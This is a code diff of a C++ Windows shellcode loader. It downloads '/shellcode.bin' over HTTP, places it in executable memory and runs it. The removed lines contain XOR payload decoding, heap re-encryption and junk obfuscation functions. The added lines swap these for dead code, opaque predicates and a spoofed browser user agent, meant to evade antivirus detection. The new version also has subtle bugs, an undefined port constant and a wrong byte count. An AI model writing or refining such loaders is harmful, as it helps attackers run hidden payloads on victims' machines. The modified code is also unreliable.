@@ -4,6 +4,8 @@
 #include <Windows.h>
 #include <iostream>
 #include <vector>
+#include <ctime>
+#include <functional>
 #pragma comment(lib,"winhttp.lib")
 #pragma warning(disable:4996)
 
@@ -13,159 +15,76 @@ typedef struct Params {
 
 typedef VOID(*fprun)(PARAMS pParams);
 
-void XOR(char* data, int len, unsigned char key) {
-    for (int i = 0; i < len; i++)
-        data[i] ^= key;
-}
-
-const char key[2] = "A";
-size_t keySize = sizeof(key);
-
-void xbrLength(const char* key, const size_t keyLength, char* buffer, const size_t length) {
-    for (size_t i = 0; i < length; ++i) {
-        buffer[i] ^= key[i % keyLength];
-    }
-}
-
-PROCESS_HEAP_ENTRY entry;
-
-void HED() {
-    SecureZeroMemory(&entry, sizeof(entry));
-    while (HeapWalk(GetProcessHeap(), &entry)) {
-        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
-            xbrLength(key, keySize, (char*)(entry.lpData), entry.cbData);
-        }
-    }
-}
-
-void obfuscationFunction1() {
-    int obfuscationVar = 5;
-    while (obfuscationVar > 0) {
-        obfuscationVar--;
-        if (obfuscationVar % 2 == 0) {
-            obfuscationVar++;
-        }
-    }
-}
-
-void obfuscationFunction2(int& obfuscationVar) {
-    obfuscationVar = obfuscationVar * 2;
-    if (obfuscationVar % 3 == 0) {
-        obfuscationVar = obfuscationVar / 3;
-    }
-}
-
-int obfuscationFunction3(int obfuscationVar) {
-    return obfuscationVar * 3;
-}
-
-void obfuscationFunction4() {
-    int obfuscationVar = 7;
-    while (obfuscationVar > 0) {
-        obfuscationVar--;
-        if (obfuscationVar % 3 == 0) {
-            obfuscationVar++;
-        }
-    }
-}
-
-void obfuscationFunction5(int& obfuscationVar) {
-    obfuscationVar = obfuscationVar * 4;
-    if (obfuscationVar % 5 == 0) {
-        obfuscationVar = obfuscationVar / 5;
-    }
-}
-
-int obfuscationFunction6(int obfuscationVar) {
-    return obfuscationVar * 6;
-}
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    obfuscationFunction1();
-    obfuscationFunction4();
-    int obfuscationVar = 1;
-    obfuscationFunction2(obfuscationVar);
-    obfuscationVar = obfuscationFunction3(obfuscationVar);
-    obfuscationFunction5(obfuscationVar);
-    obfuscationVar = obfuscationFunction6(obfuscationVar);
-    if (obfuscationVar == 1) {
-        obfuscationVar = 2;
-    }
+    std::wstring serverName = L"127.0.0.1";
+    std::wstring objectName = L"/shellcode.bin";
 
-    LPCWSTR rh = L"127.0.0.1";
-    int rp = 8080;
-    LPCWSTR rd = L"/shellcode.bin";
-    unsigned char k = 0x7e;
+    auto dead_code = []() {
+        volatile int x = rand();
+        volatile int y = rand();
+        volatile int z = x * y;
+    };
 
-    HINTERNET hI, hHS, hHR;
-    DWORD dS, dSt, dStS, dD = 0;
-    LPSTR pOB;
-    std::vector<unsigned char> PEb;
+    auto opaque_predicate = [](bool condition) {
+        return (rand() % 2 == 0) || condition;
+    };
 
-    hI = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    hHS = WinHttpConnect(hI, rh, rp, 0);
-    hHR = WinHttpOpenRequest(hHS, L"GET", rd, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    auto obfuscate = [&](std::function<void()> func) {
+        int random = rand() % 4;
+        switch (random) {
+            case 0: func(); break;
+            case 1: func(); dead_code(); break;
+            case 2: if (opaque_predicate(true)) { func(); } break;
+            case 3: dead_code(); if (opaque_predicate(true)) { func(); } break;
+        }
+    };
 
-    BOOL bR = WinHttpSendRequest(hHR, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    bR = WinHttpReceiveResponse(hHR, NULL);
+    HINTERNET hIS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hIC = WinHttpConnect(hIS, serverName.c_str(), PORT, 0);
+    HINTERNET hIO = WinHttpOpenRequest(hIC, L"GET", objectName.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    WinHttpSendRequest(hIO, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    WinHttpReceiveResponse(hIO, NULL);
+
+    DWORD dS, dD;
+    std::vector<char> PEb;
 
     do {
         dS = 0;
-        if (!WinHttpQueryDataAvailable(hHR, &dS)) {
+        if (!WinHttpQueryDataAvailable(hIO, &dS)) {
         }
 
-        pOB = new char[dS + 1];
+        char* pOB = new char[dS + 1];
 
         if (!pOB) {
-            dS = 0;
+            return 0;
         }
 
         ZeroMemory(pOB, dS + 1);
 
-        if (!WinHttpReadData(hHR, (LPVOID)pOB, dS, &dD)) {
+        if (!WinHttpReadData(hIO, (LPVOID)pOB, dS, &dD)) {
+            delete[] pOB;
+            return 0;
         }
-        else {
-            PEb.insert(PEb.end(), pOB, pOB + dD);
-        }
+
+        obfuscate([&]() {
+            PEb.insert(PEb.end(), pOB, pOB + dS);
+        });
+
+        delete[] pOB;
     } while (dS > 0);
 
     char* PE = (char*)malloc(PEb.size());
     for (int i = 0; i < PEb.size(); i++) {
-        PE[i] = PEb[i] ^ 0x7e;
+        PE[i] = PEb[i];
     }
 
-    PARAMS pP;
-    pP.pBaseAddress = (LPVOID)GetModuleHandleA(NULL);
-    LPVOID pB = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    PARAMS pParams;
+    pParams.pBaseAddress = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(pParams.pBaseAddress, PE, PEb.size());
 
-    if (NULL == pB) {
-        exit(1);
-    }
+    fprun run = (fprun)pParams.pBaseAddress;
+    run(pParams);
 
-    XOR(PE, PEb.size(), k);
-    memcpy(pB, PE, PEb.size());
-
-    HED();
-    Sleep(10);
-    HED();
-
-    fprun Run = (fprun)pB;
-    Run(pP);
-
-    WinHttpCloseHandle(hHR);
-    WinHttpCloseHandle(hHS);
-    WinHttpCloseHandle(hI);
-    free(PE);
-
-    if (obfuscationVar == 2) {
-        obfuscationVar = 1;
-    }
-
-    obfuscationFunction1();
-    obfuscationFunction4();
-    __noop();
-    __noop();
-    __noop();
     return 0;
 }
